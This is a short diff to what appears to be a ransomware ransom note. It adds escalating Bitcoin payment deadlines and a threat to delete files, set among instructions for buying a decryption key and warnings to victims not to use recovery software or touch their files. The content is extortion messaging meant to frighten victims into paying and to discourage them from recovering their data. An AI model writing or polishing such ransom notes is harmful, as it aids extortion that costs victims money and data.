@@ -164,6 +164,8 @@ To purchase your key and restore your data, please follow these three easy steps
 3. You will receive a text file with your KEY that will unlock all your files. 
    IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
 
+You have 5 days to pay $200 worth of BTC. If you're late, you will have another 5 days to pay $400. After that, your files WILL be deleted.
+
 WARNING:
 Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlock your files.
 Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
